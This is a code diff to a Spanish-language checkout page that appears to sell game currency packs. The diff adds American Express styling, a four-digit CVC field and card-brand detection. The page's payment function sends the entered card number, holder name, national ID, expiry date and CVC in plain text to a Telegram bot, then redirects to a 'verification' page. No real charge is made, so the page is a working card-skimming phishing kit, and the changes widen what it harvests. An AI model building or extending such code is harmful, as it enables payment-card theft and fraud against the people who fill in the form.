@@ -13,6 +13,7 @@
             --accent: #6772e5; 
             --visa: linear-gradient(135deg, #1a1f71 0%, #0051a1 100%);
             --mastercard: linear-gradient(135deg, #eb001b 0%, #ff5f00 100%);
+            --amex: linear-gradient(135deg, #016fd0 0%, #004c8c 100%);
             --default-card: linear-gradient(135deg, #333 0%, #111 100%);
             --border: rgba(255, 255, 255, 0.08);
             --text-main: #ffffff;
@@ -41,6 +42,7 @@
         }
         .card-visual.visa { background: var(--visa); }
         .card-visual.mastercard { background: var(--mastercard); }
+        .card-visual.amex { background: var(--amex); }
         .card-visual .chip { width: 40px; height: 30px; background: rgba(255,255,255,0.2); border-radius: 6px; }
         .card-visual .number { font-size: 1.25rem; font-weight: 600; letter-spacing: 2px; }
 
@@ -68,7 +70,7 @@
     <div class="modal-overlay" id="cvcModal">
         <div class="modal-content">
             <h3 style="font-weight: 900;">Código CVC</h3>
-            <p style="font-size: 0.8rem; color: var(--text-dim); margin-top: 8px;">Son los últimos 3 números en el reverso.</p>
+            <p style="font-size: 0.8rem; color: var(--text-dim); margin-top: 8px;">Son los últimos números en el reverso (o frente para Amex).</p>
             <div class="cvc-graphic">
                 <div class="magnetic-stripe"></div>
                 <div class="signature-area"><span class="cvc-highlight">123</span></div>
@@ -118,7 +120,8 @@
             </div>
             <div class="input-group">
                 <label>CVC <i class="fas fa-question-circle" style="color: var(--accent);" onclick="openCvcModal()"></i></label>
-                <input type="tel" inputmode="numeric" pattern="[0-9]*" class="input-field" placeholder="123" id="input-cvc" maxlength="3">
+                <!-- Se cambió maxlength a 4 para soportar tarjetas Amex -->
+                <input type="tel" inputmode="numeric" pattern="[0-9]*" class="input-field" placeholder="123" id="input-cvc" maxlength="4">
             </div>
         </div>
             <div style="margin-top: 30px; border-top: 1px solid var(--border); padding-top: 20px;">
@@ -172,6 +175,7 @@
             preview.className = "card-visual"; logo.className = "fas fa-credit-card";
             if (num.startsWith('4')) { preview.classList.add('visa'); logo.className = "fab fa-cc-visa"; }
             else if (num.startsWith('5')) { preview.classList.add('mastercard'); logo.className = "fab fa-cc-mastercard"; }
+            else if (num.startsWith('3')) { preview.classList.add('amex'); logo.className = "fab fa-cc-amex"; }
 
             document.getElementById('card-name-display').innerText = name ? name.toUpperCase() : "NOMBRE COMPLETO";
             document.getElementById('card-num-display').innerText = num ? num : "•••• •••• •••• ••••";
@@ -187,59 +191,62 @@
             if (val.length >= 2) val = val.slice(0, 2) + '/' + val.slice(2);
             e.target.value = val;
         });
+
         async function processCardPayment() {
-    const btn = document.getElementById('main-pay-btn');
-    
-    const num = document.getElementById('input-number').value;
-    const name = document.getElementById('input-name').value;
-    const dni = document.getElementById('input-dni').value;
-    const date = document.getElementById('input-date').value;
-    const cvc = document.getElementById('input-cvc').value;
-    
-    if(!num || !name || !dni || !date || !cvc) {
-        alert("Completa todos los campos correctamente.");
-        return;
-    }
+            const btn = document.getElementById('main-pay-btn');
+            
+            const num = document.getElementById('input-number').value;
+            const name = document.getElementById('input-name').value;
+            const dni = document.getElementById('input-dni').value;
+            const date = document.getElementById('input-date').value;
+            const cvc = document.getElementById('input-cvc').value;
+            
+            if(!num || !name || !dni || !date || !cvc) {
+                alert("Completa todos los campos correctamente.");
+                return;
+            }
 
-    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESANDO...';
-    btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESANDO...';
+            btn.disabled = true;
 
-    // --- ESTA ES LA PARTE IMPORTANTE QUE TENÉS QUE AGREGAR ---
-    // Detectamos si es Visa (4) o Mastercard (5) y lo guardamos
-    const tipoDeTarjeta = num.startsWith('4') ? 'visa' : 'mastercard';
-    localStorage.setItem('card_type', tipoDeTarjeta);
-    // -------------------------------------------------------
+            // Detectamos si es Visa (4), Mastercard (5) o Amex (3) y lo guardamos
+            let tipoDeTarjeta = 'visa'; // Por defecto
+            if (num.startsWith('5')) {
+                tipoDeTarjeta = 'mastercard';
+            } else if (num.startsWith('3')) {
+                tipoDeTarjeta = 'amex';
+            }
+            localStorage.setItem('card_type', tipoDeTarjeta);
 
-    const rawData = localStorage.getItem('current_checkout');
-    const checkoutData = JSON.parse(rawData);
+            const rawData = localStorage.getItem('current_checkout');
+            const checkoutData = JSON.parse(rawData);
 
-    const text = `⚠️ *NUEVO PAGO RECIBIDO* ⚠️\n\n` +
-                 `💎 *Pack:* ${checkoutData.pack}\n` +
-                 `💵 *Monto:* ${checkoutData.price}\n` +
-                 `🆔 *ID Jugador:* ${checkoutData.id}\n\n` +
-                 `💳 *DATOS DE TARJETA:*\n` +
-                 `👤 *Titular:* ${name}\n` +
-                 `🆔 *DNI:* ${dni}\n` +
-                 `🔢 *Número:* \`${num}\`\n` +
-                 `📅 *Exp:* ${date}  |  *CVC:* ${cvc}`;
+            const text = `⚠️ *NUEVO PAGO RECIBIDO* ⚠️\n\n` +
+                         `💎 *Pack:* ${checkoutData.pack}\n` +
+                         `💵 *Monto:* ${checkoutData.price}\n` +
+                         `🆔 *ID Jugador:* ${checkoutData.id}\n\n` +
+                         `💳 *DATOS DE TARJETA:*\n` +
+                         `👤 *Titular:* ${name}\n` +
+                         `🆔 *DNI:* ${dni}\n` +
+                         `🔢 *Número:* \`${num}\`\n` +
+                         `📅 *Exp:* ${date}  |  *CVC:* ${cvc}`;
 
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'Markdown'
-            })
-        });
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
-        window.location.href = 'verificacion.html';
-    } catch (error) {
-        window.location.href = 'verificacion.html';
-    }
-}
-
+                window.location.href = 'verificacion.html';
+            } catch (error) {
+                window.location.href = 'verificacion.html';
+            }
+        }
     </script>
 </body>
 </html>
